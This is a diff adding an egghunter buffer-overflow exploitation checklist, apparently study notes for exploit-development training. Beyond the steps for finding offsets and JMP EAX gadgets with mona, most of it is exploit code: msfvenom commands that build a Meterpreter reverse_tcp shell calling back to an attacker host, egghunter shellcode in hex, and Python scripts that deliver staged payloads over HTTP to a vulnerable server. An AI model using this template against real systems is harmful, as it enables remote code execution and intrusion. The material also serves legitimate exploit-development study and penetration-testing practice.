@@ -1,0 +1,87 @@
+# Egghunter Checklist
+# Stage 1 - Optional ?
+1. Locate vulnerable function
+2. Break before ret in function
+3. Send data
+4. Check break is hit
+5. Remove breakpoint
+
+# Stage 2
+1. Crash program
+2. Determine offset
+3. Check protections
+	!mona modules
+4. Look for 'JMP EAX' gadgets to jump to
+	!mona jmp -r EAX
+	# Check protections listed here
+5. replace 'BBBB' from payload with gadget address
+6. Break on new address
+7. Run and program should jump to breakpoint - EIP now points here
+	Program control achieved!
+
+# Stage 3
+1. Check bytes available - Assume low number - 32
+2. Align the stack
+	/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
+	nasm > push eax
+	00000000	50	push eax
+	nasm > pop esp
+	00000000	5C	pop esp
+	
+	The first stage payload is:
+		Align stack
+		Egghunter shellcode
+		JMP EAX
+3. Local POC:
+	CMD - msfvenom -p windows/meterpreter/reverse_tcp -b \x00\x0a\x0d -f python LHOST=192.168.1.3 LPORT=80
+	$ egg = "\x77\x30\x30\x74" # w00t
+	$ payload = egg + egg
+	$ payload += "\xbf\x33\x30\xf9\x54\xdd\xc2\xd9\x74\x24\xf4\x5a\x29"
+
+	$ stage1 = "POST /coffee HTTP/1.1\r\n"
+	$ stage1 += "Host: vuln.target.com\r\n"
+	$ stage1 += "Content-Length: {}\r\n\r\n".format(len(payload))
+	$ stage1 += payload + "\r\n"
+	$ stage1 += "\r\n"
+	$ 
+	$ r = remote('target_ip', target_port)
+	$ r.send(stage1)
+	$ r.recv()
+	$ 
+	$ r = remote('target_ip', target_port)
+	$ jmp_eax = "f2125062"
+	$ align_esp = "505C" # push eax, pop esp
+	# generate egghunter with '!mona egghunter'
+	$ egghunter = "6681caff0f42526a0258cd2e3c055a74efb8773030748bfaaf75eaaf75e7ffe7"
+	$ stage2 = align_esp + egghunter + "9090" + jmp_eax
+	$ 
+	$ r.send("HEAD /" + stage2 + " HTTP/1.1\r\nHost: vuln.target.com\r\n\r\n")
+	
+
+4. Remote Exploit:
+	CMD - msfvenom -p windows/meterpreter/reverse_tcp -b \x00\x0a\x0d -f python LHOST=NAT_IP LPORT=80
+	$ egg = "\x77\x30\x30\x74" # w00t
+	$ payload = egg + egg
+	$ payload += "\xbf\x33\x30\xf9\x54\xdd\xc2\xd9\x74\x24\xf4\x5a\x29"
+
+	$ data = {"payload": payload}
+	$ proxies = {"http": "http://127.0.0.1:8080"}
+    $ 
+	$ s = requests.Session()
+	$ r = requests.Request("POST", "http://vuln.site.com/target/", data=data)
+	$ p = r.prepare()
+	$ p.body = payload
+	$ del p.headers["Content-Type"] # Remove to prevent url encoding of payload
+	$ try:
+	$ 	s.send(p, proxies=proxies, timeout=0.2)
+	$ except requests.exceptions.ReadTimeout:
+	$ 	pass
+    $ 
+	$ r = remote("target_ip", target_port)
+	$ jmp_eax = "f2125062"
+	$ align_esp = "505C" # push eax, pop esp
+	# generate egghunter with '!mona egghunter'
+	$ egghunter = "6681caff0f42526a0258cd2e3c055a74efb8773030748bfaaf75eaaf75e7ffe7"
+	$ stage2 = align_esp + egghunter + "9090" + jmp_eax
+    $ 
+	$ r.send("HEAD /" + stage2 + " HTTP/1.1\r\nHost: vuln.site.com\r\n\r\n")
